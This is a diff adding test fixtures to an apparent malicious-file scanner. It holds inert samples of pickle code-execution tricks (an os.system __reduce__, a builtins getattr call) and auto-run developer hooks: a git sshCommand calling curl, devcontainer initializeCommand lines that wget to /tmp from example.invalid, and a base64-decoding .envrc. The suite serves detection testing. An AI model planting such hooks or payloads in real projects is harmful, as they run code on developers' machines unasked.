@@ -104,6 +104,72 @@ def _binbytes_argument_pickle() -> bytes:
     )
 
 
+class _SystemCall:
+    """Pickles as a call to os.system. pickle.dumps only records it; nothing here loads it."""
+
+    def __reduce__(self) -> tuple[object, tuple[str]]:
+        import os
+
+        return (os.system, ("echo inert",))
+
+
+def _prefixed_pickle(prefix: bytes) -> bytes:
+    """A dangerous call after one opcode that the earlier walker stopped at (POPped)."""
+    call = _dangerous_pickle()[2:-1]
+    return bytes((0x80, 0x04)) + prefix + b"0" + call + b"."
+
+
+def _pickle_walker_cases() -> list[tuple[str, bytes, str | None]]:
+    long4 = b"\x8b" + (3).to_bytes(4, "little", signed=True) + b"\x01\x02\x03"
+    eight = (3).to_bytes(8, "little")
+    shaped = [{"w": [1.0, 2.0]}, {1, 2}, frozenset({3}), 2**90, b"x" * 300, _SystemCall()]
+    hits: list[tuple[str, bytes, str | None]] = [
+        ("long1.pkl", _prefixed_pickle(b"\x8a\x02\x00\x01"), "heuristic_pickle_reduce"),
+        ("long1-neg.pkl", _prefixed_pickle(b"\x8a\x01\xff"), "heuristic_pickle_reduce"),
+        ("long4.pkl", _prefixed_pickle(long4), "heuristic_pickle_reduce"),
+        ("binstring.pkl", _prefixed_pickle(b"U\x03abc"), "heuristic_pickle_reduce"),
+        ("binbytes8.pkl", _prefixed_pickle(b"\x8e" + eight + b"abc"), "heuristic_pickle_reduce"),
+        ("bytearray8.pkl", _prefixed_pickle(b"\x96" + eight + b"abc"), "heuristic_pickle_reduce"),
+        (
+            "legacy-two-pickles.pt",
+            pickle.dumps(1, protocol=2) + _dangerous_pickle(),
+            "heuristic_pickle_reduce",
+        ),
+        (
+            "builtin-getattr.pkl",
+            b"\x80\x02c__builtin__\ngetattr\n)R.",
+            "heuristic_pickle_reduce",
+        ),
+    ]
+    for protocol in (2, 3, 4, 5):
+        hits.append(
+            (
+                f"shaped-p{protocol}.pkl",
+                pickle.dumps(shaped, protocol=protocol),
+                "heuristic_pickle_reduce",
+            )
+        )
+        hits.append(
+            (
+                f"shaped-p{protocol}.pt",
+                _zip("archive/data.pkl", pickle.dumps(shaped, protocol=protocol)),
+                "heuristic_pickle_reduce",
+            )
+        )
+    benign = [
+        {"state_dict": {"w": [1.0, 2.0]}, "step": 2**70},
+        [{1, 2}, frozenset({3}), bytearray(b"ab"), b"ab", 1 + 2j, range(3), slice(1, 2)],
+        ValueError("inert"),
+    ]
+    for protocol in (2, 3, 4, 5):
+        for index, value in enumerate(benign):
+            hits.append(
+                (f"benign{index}-p{protocol}.pkl", pickle.dumps(value, protocol=protocol), None)
+            )
+    hits.append(("long4-list.pkl", b"\x80\x04]" + long4 + b"a.", None))
+    return hits
+
+
 def _safetensors(valid: bool) -> bytes:
     header = {"w": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}
     raw = json.dumps(header, separators=(",", ":")).encode()
@@ -390,6 +456,85 @@ def cases() -> list[tuple[str, bytes, str | None]]:
         ("model.pt", _zip("data.pkl", _dangerous_pickle()), "heuristic_pickle_reduce"),
         ("note.pkl", pickle.dumps({"note": "hello"}, protocol=4), None),
         *_encoded_text_cases(),
+        # A zipped checkout: the member's own name reaches the name-scoped rules.
+        (
+            "repo-git.zip",
+            _zip("repo/.git/config", b"[core]\n\tsshCommand = sh -c 'curl -fsS x'\n"),
+            "dev_git_config_exec",
+        ),
+        (
+            "repo-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "repo-envrc.zip",
+            _zip("repo/.envrc", b"echo aW5lcnQ= | base64 -d > /tmp/x\n"),
+            "dev_envrc_exec",
+        ),
+        (
+            "repo-ok.zip",
+            _zip("repo/.envrc", b"use flake\n"),
+            None,
+        ),
+        # Codex review of #160: keys belong to their own section, values end at their string,
+        # pretty-printed objects and arrays are read, and a backslash member path is a path.
+        (
+            "alias.config",
+            b"[core]\n\tbare = false\n[alias]\n\tprocess = !sh -c 'git add -A'\n",
+            None,
+        ),
+        (
+            "devcontainer.json",
+            b'{"initializeCommand":"mkdir -p .cache","postCreateCommand":"wget -qO /tmp/i x"}',
+            None,
+        ),
+        (
+            "obj-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json",
+                b'{\n  "initializeCommand": {\n    "prepare": "wget -qO /tmp/i https://example.invalid/i"'
+                b"\n  }\n}\n",
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "array-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json",
+                b'{\n  "initializeCommand": [\n    "sh",\n    "-c",\n'
+                b'    "wget -qO /tmp/i https://example.invalid/i"\n  ]\n}\n',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "backslash-devcontainer.zip",
+            _zip(
+                "repo\\.devcontainer\\devcontainer.json",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "trailing-dot-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json. ",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "trailing-dot-envrc.zip",
+            _zip("repo/.envrc.", b"echo aW5lcnQ= | base64 -d > /tmp/x\n"),
+            "dev_envrc_exec",
+        ),
+        # The same bytes under another name are not a dev container or direnv file.
+        ("init.json", b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}', None),
+        ("envrc.sh", b"echo aW5lcnQ= | base64 -d > /tmp/x\n", None),
+        *_pickle_walker_cases(),
         ("ok.safetensors", _safetensors(True), None),
         ("bad.safetensors", _safetensors(False), "heuristic_safetensors_header"),
         ("ok.gguf", _gguf(True), None),
